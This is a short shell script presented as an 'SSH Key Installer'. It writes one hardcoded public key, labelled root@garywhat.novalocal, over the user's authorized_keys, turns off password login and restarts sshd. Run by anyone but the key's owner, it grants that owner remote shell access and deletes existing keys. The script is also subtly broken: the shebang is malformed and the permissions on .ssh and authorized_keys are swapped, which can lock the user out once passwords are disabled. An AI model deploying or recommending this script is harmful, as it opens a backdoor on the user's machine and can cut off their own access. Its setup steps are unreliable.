#/bin/sh
echo '============================
      SSH Key Installer
	      V1.0 Alpha
		Author:Kirito
============================'
cd ~
mkdir .ssh
cd .ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCS9V0y35fUCZ03Ujs2oqYX1X2LhbWOUVXdTkCUuTXAS0ccZbyOEm34qhxmZ9f4P0KM31tO+72Uu2E47sCmnylPNb05qbR6HpVt2C1TPilEsgNUWXjca/bvCx4Ky3WBXMM/8OiJ5Gstiu+k/9rXtESLL1W77Y24yf4ffNzcLLy63VnwUlL8LnJZ80x60JrDcWq0Jo2C5yS4B3dzglewqHRacmFt4eJALFFQy4omgPzmKFa6EF/uRdJXUMsbR+girLL1fvEBOy+IZc8hgXncuAk/La1BO79TRHXMvmaLrTUELTFQiRjdtJF3su5+Lza20yK/T5hxlDzqF2+11OwfZppP root@garywhat.novalocal
' > authorized_keys
chmod 700 authorized_keys
cd ../
chmod 600 .ssh
cd /etc/ssh/
sed -i '/PasswordAuthentication/s/#PasswordAuthentication yes/PasswordAuthentication no/g' sshd_config

service sshd restart
service ssh restart
